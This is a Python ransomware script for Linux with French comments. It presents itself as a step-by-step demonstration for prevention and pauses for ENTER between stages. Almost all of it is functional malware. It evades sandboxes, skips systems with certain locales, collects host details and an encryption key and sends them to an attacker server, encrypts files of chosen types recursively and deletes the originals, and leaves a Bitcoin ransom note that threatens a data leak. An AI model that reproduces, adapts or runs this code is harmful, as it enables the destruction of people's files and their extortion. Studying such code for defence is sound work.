#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ransomware for GNU/Linux systems in prevention issues
Usage::
	./ransom.py -d /path/test -f docx,xlsx,png
	./ransom.py -d /path/test -f docx,xlsx,png -e cryted -w '/path/wallpaper.png'
"""

import os, platform
import argparse
import string
import base64
import secrets
from datetime import datetime
from hashlib import md5
import pyfiglet
import requests
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import AES

# colors
WHITE = '\033[0m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
DEBUGBLUE = '\033[94m[#]\033[0m '
WARNINGRED = '\033[91m[-]\033[0m '
WARNINGRE = '\n\033[92m[+]\033[0m '
INFOYELLOW = '\033[93m[~]\033[0m '

#PROTO = 'http'
#SRV_IP = '127.0.0.1'
#SRV_PORT = 80
PROTO = 'https'
SRV_IP = 'localhost'
SRV_PORT = 443
SRV_CERT = 'server.pem'

# RSA public key
PUB_KEY_TXT = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEArJeVTp/1ElaQlycdyzx8
Ft1SWbyUKpXhD18oe76ffAnbycKJbMBSyFim/kHm421PRqcOEHrJFh8Ph/VcLH5Y
Y0WKFCMw/iSRnO2UhueVpwnP/e8AcWeQxZuBbgDU1ITMIRgpOnqAaGZcWKn7rzHG
LLZaYsV+ho+CIE3JJB1frLUGBeTOb5ZSIJX/wLBzE9jgTUChBPO/lk0K4rxTnwra
FEvSm77HYe6+PSmwBrVcE9dLGs1ImVFVVDyv8qHHB7rJ4fD9WJ6m8YhfBzhjXkHu
CbnSwDvcpofcE/wl5PlBP7Hn5Lm4Uz6fAcdFu75n8zO/+xZ9gsAaf+2GsRJXmQby
HhlolncvPcY5tz5++xHrZtBuxFjXc7GTnogm2dmKXiUjUS5SzUwsZ3ZPr8rsICgU
kVD3w+xp3X0Bw4X5mPGmnE+LqQRShWHJv/uYZOqDQLG6Oa9wri8wSPRrjo8y85+c
BY7S5Cl4L/Cc7b3BK5cY1rm/4+AB5K7CGa2CiWjrhlQFD+FTACorZuv7kWg8dHmc
xGjQcBmXaV3jYTSHq1X9HlBlZ8VX9OA/2XY54ykgPoBTzpnPh50j6kkhqpUIEDIe
9MmpX+0Q16QssVBspl1r/aj+T3RC7l5qoooxlqOMmA3h9df0zk4ztipseDPiQ6Q1
S1ZmIcQSk1H93ZrlUJ2NpGECAwEAAQ==
-----END PUBLIC KEY-----"""

def banner():
	ascii_banner = pyfiglet.figlet_format("Bien s'passer ne t'inquiete pas")
	print(ascii_banner)

def error(desc="Aucune description"):
	print(f"{WARNINGRED}Erreur : {desc}")
	exit(0)

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-d', '--directory', 
						dest='directory',
						required=True,
						help="emplacement des fichiers ?? chiffrer. E.g. /home,/mnt,/var/www,/media",
						type=str)
	parser.add_argument('-f', '--format',
						dest='format',
						required=True,
						help="liste des formats de fichiers cibles. E.g. png,jpg,pptx,docx",
						type=str)
	parser.add_argument('-e', '--extension',
						dest='extension',
						required=False,
						default='cry',
						help="extension apr??s chiffrement. Par d??faut cry",
						type=str)
	parser.add_argument('-w', '--wallpaper',
						dest='wallpaper',
						required=False,
						default='wallpaper.jpg',
						help="fond d'??cran. Par d??faut wallpaper.jpg",
						type=str)
	args = parser.parse_args()

	print(f"{WARNINGRE}--directory\t{args.directory}")
	print(f"{WARNINGRE}--format\t{args.format}")
	print(f"{WARNINGRE}--extension\t{args.extension}")
	print(f"{WARNINGRE}--wallpaper\t{args.wallpaper}")
	return args

def verify_args(args):
	# --directory
	if args.directory:
		list_directory_path = args.directory.split(',')
		for path in list_directory_path:
			if not os.path.exists(path):
				error(desc="Un des r??pertoires sp??cifi??s n'existe pas")
	else:
		error(desc="Aucun r??pertoire sp??cifi??")

	# --format
	if args.format:
		alphabet = string.ascii_letters + string.digits
		list_format = args.format.split(',')
		for format in list_format:
			for letter in format:
				if letter not in alphabet:
					error(desc="Syntax d'un format de fichier erron??e")
	else:
		error(desc="Aucun format de fichier sp??cifi??")
		
	# --extension
	if args.extension:
		for letter in args.extension:
			if letter not in alphabet:
				error(desc="Syntax de l'extension erron??e")
	else:
		error(desc="Aucune extension sp??cifi??e")

	# --wallpaper (optional)
	if args.wallpaper:
		if not os.path.exists(args.wallpaper):
			error("Le chemin du fond d'??cran est incorrect")
		else:
			ext = os.path.splitext(args.wallpaper)[1]
			if ext != '.jpg' and ext != '.jpeg' and ext != '.png':
				error("Le fond d'??cran ne correspond pas ?? un format d'image connu")

def check_internet():
	try:
		req_google = requests.get('https://google.com')
		if req_google.status_code == 200:
			print(f"{WARNINGRE}GET / google.com - 200 OK")
			print(f"{DEBUGBLUE}Une v??rification de l'acc??s Internet est effectu??e au d??but pour s'assurer de pouvoir envoyer la cl?? de chiffrement au serveur de l'attaquant et ??galement de pouvoir extraire les donn??es")
		else:
			error(desc="Aucun acc??s Internet")
	except:
		error(desc="Aucun acc??s Internet")

def check_sandbox():
	if not os.path.exists('/.dockerenv'):
		print(f"{WARNINGRE}Environnement Docker non d??tect??")
		print(f"{DEBUGBLUE}Les ransomwares et autres codes malveillants v??rifient s'ils sont dans un environnement virtuel pour ne pas s'ex??cuter et ainsi pouvoir contourner les s??curit??s")
	else:
		error(desc="Le programme s'ex??cute dans un conteneur Docker")

def check_language():
	SAFE_LANG = {'az_AZ.UTF-8': 'Azerbaijan', 'be_BY.UTF-8': 'Bi??lorussie',  'hy_AM.UTF-8': 'Arm??nie',  'ka_GE.UTF-8' : 'G??orgie',
				 'kk_KZ.UTF-8': 'Kazakhstan', 'ky_KZ.UTF-8': 'Kirghizistan', 'ro_RO.UTF-8': 'Roumanie', 'ru_RU.UTF-8': 'Russie',
				 'syr_SY.UTF-8':'Syrie',      'tt_RU.UTF-8': 'Russie',       'uk_UA.UTF-8': 'Ukraine',  'uz_UZ.UTF-8': 'Ouzb??kistan'}
	LOCAL_LANG = os.getenv("LANG")

	print(f"{WARNINGRE}Liste des pays amis ?? ne pas cibler")
	for code, country in SAFE_LANG.items():
		if LOCAL_LANG == code:
			error(f"La langue utilis??e sur le syst??me '{code}' est reconnue comme ??tant une langue d'un pays ?? ne pas cibler")
		print(f"{code} :\t{country}")

	print(f"{WARNINGRE}La langue utilis??e '{LOCAL_LANG}' ne fait partie des pays cit??s, le code continue son ex??cution")
	print(f"{DEBUGBLUE}La v??rification de la langue utilis??e sur le syst??me permet de d??grossir drastiquement les surfaces d'attaques sur les pays qui ont des int??r??ts g??opolitiques proche de l'acteur malveillant")

def generate_aes_key():
	# G??n??ration d'une cl?? de taille arbitraire
	alphabet = string.ascii_letters + string.digits
	key = ''
	for _ in range(40):
		key += secrets.choice(alphabet)

	print(f"{WARNINGRE}G??n??ration al??atoire de la cl?? AES : {key}")
	print(f"{DEBUGBLUE}Cette cl?? sera utilis??e pour chiffrer les fichiers")
	return key

def grab_info(aes_key):
	print(f"{WARNINGRE}R??cup??ration de quelques informations")

	try:
		public_ip = requests.get('http://ip.42.pl/raw').text
		print(f"IP publique : {public_ip}")
	except:
		public_ip = ''
		print(f"{WARNINGRED}IP publique introuvable")
	
	username = os.getenv("USERNAME")
	print(f"Username : {username}")

	hostname = platform.node()
	print(f"Hostname : {hostname}")

	version = platform.release()
	print(f"Version : {version}")

	date_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
	print(f"Date : {date_time}")

	list_info = [aes_key, public_ip, username, hostname, version, date_time]
	return list_info

def send_info(infos):
	print(f"{DEBUGBLUE}Envoi des informations au serveur HTTP")
	print(f"{WARNINGRE}Informations ?? envoyer:")

	for i in infos:
		print(f"- {i}")
	
	# Encoder
	infos = str(infos).encode()
	print(f"{WARNINGRE}Donn??es encod??es:\n{infos}")

	# Chiffrer les informations
	print(f"{WARNINGRE}RSA-4096 bits cl?? publique, utilis??e pour le chiffrement des donn??es:\n{PUB_KEY_TXT}")
	pub_key = RSA.importKey(PUB_KEY_TXT)
	cipher = PKCS1_OAEP.new(pub_key)
	try:
		ciphertext = cipher.encrypt(infos)
		print(f"{WARNINGRE}Donn??es chiffr??es (bytes):\n{ciphertext}")
		#print(f"{WARNINGRE}Donn??es chiffr??es (ASCII):\n{binascii.hexlify(ciphertext)}\n")
	except:
		pass

	# Convertion en base64
	ciphertext = base64.b64encode(ciphertext)
	print(f"{WARNINGRE}Donn??es chiffr??es (base64):\n{ciphertext}")

	data = {'ciphertext': ciphertext}
	url_addr = PROTO + '://' + SRV_IP + ':' + str(SRV_PORT)

	print(f"{WARNINGRE}Envoi des donn??es au serveur HTTP '{SRV_IP}:{SRV_PORT}' de l'attaquant (voir c??t?? serveur)")
	try:
		req = requests.post(url_addr, data=data, verify=SRV_CERT)
		if req.status_code == 200:
			print(f"{WARNINGRE}Envoi des donn??es effectu?? avec succ??s")
			print(f"{DEBUGBLUE}G??n??ralement l'attaquant utilise un nom de domaine commun ou un site l??gitime compromis, pour ne pas ??veiller l'attention sur le r??seau")
			print(f"{DEBUGBLUE}Les donn??es sont envoy??es en POST / pour ne pas apparaitre dans les analyses d'adresses URL")
			print(f"{DEBUGBLUE}L'utilisation du HTTPS est d'usage. En effet l'utilisation du TLS emp??che l'analyse du contenu des trames HTTP gr??ce au chiffrement, cela permet ??galement de ne pas ??veiller l'attention")
		else:
			error("Les donn??es n'ont pas pu ??tre envoy??es au serveur")
	except:
		error("Les donn??es n'ont pas pu ??tre envoy??es au serveur")

def derive_key_and_iv(password, salt, key_length, iv_length): # Derive key and IV from password and salt
    d = b''
    while len(d) < key_length + iv_length:
        d += md5(d + str(password).encode() + salt).digest()

    return d[:key_length], d[key_length:key_length + iv_length]   # key(32 bytes, AES-256), iv(16 bytes)

def encrypt(in_file, out_file, password, key_length):
    # G??n??rer le 'salt' et l'??crire au d??but du nouveau fichier
    bs = AES.block_size
    salt = get_random_bytes(bs)
    out_file.write(salt)

    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    cipher = AES.new(key, AES.MODE_EAX, iv)
    finished = False

    while not finished:
        # lire le contenu du fichier
        chunk = in_file.read(1024 * bs)

        if len(chunk) == 0 or len(chunk) % bs != 0:
            padding_length = (bs - len(chunk) % bs) or bs
            chunk += str.encode(padding_length * chr(padding_length))
            finished = True

        out_file.write(cipher.encrypt(chunk))

def encryption_process(args, aes_key):
	print(f"{WARNINGRE}Chiffrement des fichiers")

	list_directory_path = args.directory.split(',')
	files = []

	# Lister l'arborescence de fichiers
	while len(list_directory_path) > 0:
		for (dirpath, dirnames, filenames) in os.walk(list_directory_path.pop()):
			list_directory_path.extend(dirnames)
			files.extend(map(lambda n: os.path.join(*n), zip([dirpath] * len(filenames), filenames)))

	list_format = args.format.split(',')

	for filepath in files:
		ext = os.path.splitext(filepath)[1]
		# Ne pas chiffrer un fichier d??j?? chiffr??
		if ext != '.' + args.extension:
			for format in list_format:
				# Si le format du fichier correspond ?? l'un des formats sp??cifi??s
				if ext == '.' + format:
					# D??finir le nom du nouveau fichier 'filename.docx.cry'
					newfilepath = filepath + '.' + args.extension
					# Chiffrer le fichier actuel dans le nouveau
					with open(filepath, 'rb') as in_file, open(newfilepath, 'wb') as out_file:
						print(f"{DEBUGBLUE}{filepath}", end='\n')
						print(f"{DEBUGBLUE}Encrypt...", end='\r')
						key_length=32	# AES-256 bits = 32 bytes
						encrypt(in_file, out_file, aes_key, key_length)
						# Supprimer le fichier originel
						os.remove(filepath)

def check_gnome():
	if os.getenv("XDG_CURRENT_DESKTOP") == 'GNOME':
		print(f"{WARNINGRE}L'environnement graphique GNOME a ??t?? d??tect??")
		return True
	print(f"{WARNINGRED}L'environnement graphique GNOME n'a pas ??t?? d??tect??")
	return False

def change_wallpaper(args):
	wallpaper = args.wallpaper
	if wallpaper:
		print(f"{WARNINGRE}Modification du fond d'??cran avec '{wallpaper}'")
		abspath = os.path.abspath(wallpaper)
		command = "gsettings set org.gnome.desktop.background picture-uri file:" + abspath
		os.system(command)

def readme(date):
	desktop_path_fr = os.path.join(os.path.join(os.path.expanduser('~')), 'Bureau/')
	desktop_path_en = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop/')

	if os.path.exists(desktop_path_fr):
		readme_path = desktop_path_fr + 'readme.txt'
	elif os.path.exists(desktop_path_en):
		readme_path = desktop_path_en + 'readme.txt'

	content = f"""Vos fichiers personnels ont ??t?? chiffr??s par un ransomware avec l'algorithme de chiffrement AES-256 bits.
Avant le chiffrement de ces derni??res, elles ont ??t?? extraites pour que nous les r??cup??rions.
Veillez ?? ne pas renommer ou d??placer les fichiers chiffr??s.
Pour r??cup??rer vos donn??es, veuillez envoyer l'??quivalent en Bitcoin de 50 000 ??? ?? l'adresse Bitcoin suivante bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq.
Si la somme n'a pas ??t?? vers??e d'ici 48h, nous rendrons public vos donn??es sur Internet et la cl?? de chiffrement utilis??e sera d??finitivement supprim??e.
Vos donn??es seront alors perdues.
Date de compromission : {date}"""
	
	print(f"{WARNINGRE}Cr??ation d'un fichier 'readme.txt' sur le Bureau de la victime pour l'informer des consignes ?? suivre pour r??cup??rer ses donn??es et des risque qu'elle encourt le cas ??ch??ant")
	with open(readme_path, 'w') as file:
		file.write(content)
	
	with open(readme_path, 'r') as file:
		print(file.read())

	print(f"\n{DEBUGBLUE}?? la toute fin, le programme se supprime pour ??viter qu'une personne puisse faire de la r??tro ing??nierie. Elle pourrait en d??duire l'individu ou le groupe ?? l'origine de l'attaque")

def main():
	args = parse_args()
	verify_args(args)

	banner()

	enter = input('ENTER')
	check_internet()

	enter = input('ENTER')
	check_sandbox()

	enter = input('ENTER')
	check_language()

	enter = input('ENTER')
	aes_key = generate_aes_key()

	enter = input('ENTER')
	list_info = grab_info(aes_key)

	enter = input('ENTER')
	send_info(infos=list_info)

	enter = input('ENTER')
	print(f"{DEBUGBLUE}Dans certains cas, le ransomware exfiltre tous les fichiers sur un serveur Cloud distant (Principe de double extorsion)")

	enter = input('ENTER')
	encryption_process(args, aes_key)

	enter = input('ENTER')
	if check_gnome() is True:
		change_wallpaper(args)
	
	enter = input('ENTER')
	readme(date=list_info[5])

if __name__ == '__main__':
	main()
	exit(0)